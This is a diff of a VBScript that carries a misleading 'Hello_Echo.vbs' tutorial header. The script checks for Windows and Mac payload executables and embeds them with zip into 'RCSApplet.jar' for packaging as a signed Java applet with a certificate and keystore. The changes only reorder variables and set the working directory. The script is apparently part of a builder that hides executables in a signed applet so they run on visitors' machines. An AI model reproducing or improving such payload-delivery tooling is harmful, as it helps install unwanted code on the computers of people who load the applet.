@@ -1,9 +1,6 @@
 '  Hello_Echo.vbs
 '  Copyright (c) 2008 by Dr. Herong Yang, http://www.herongyang.com/
 
-JarFile = "RCSApplet.jar"
-KeyStore = "applet_keystore"
-
 Set oArgs = WScript.Arguments
 If oArgs.Length < 3 Then 
 	WScript.Echo "No arguments provided!"
@@ -20,17 +17,23 @@ WScript.Echo "Using temporary directory : " & TmpDir
 WScript.Echo "Output name               : " & OutputName
 WScript.Echo
 
-SignedApplet = OutputName & ".jar"
-AppletCertificate = OutputName & ".cer"
-
+' Check that temporary directory exists
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 If not objFSO.FolderExists (TmpDir) then
 	WScript.Echo "Cannot find temporary directory " & TmpDir
 	WScript.Quit 1
 End If
 
+' switch current directory to temporary
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.CurrentDirectory = TmpDir
+
+SignedApplet = OutputName & ".jar"
+AppletCertificate = OutputName & ".cer"
 PayloadWin = Payload & ".exe"
 PayloadMac = Payload
+JarFile =  "RCSApplet.jar"
+KeyStore = "applet_keystore"
 
 If not objFSO.FileExists(PayloadWin) then
 	WScript.Echo "Cannot find Windows payload file " & PayloadWin
@@ -46,7 +49,6 @@ objFSO.CopyFile PayloadWin, "win"
 objFSO.CopyFile PayloadMac, "mac"
 
 WScript.Echo "Adding payload to jar file."
-Set WshShell = CreateObject("WScript.Shell")
 
 WScript.Echo "Embedding Windows payload."
 Ret = WshShell.Run("zip -u " & JarFile & " win", 0, true)
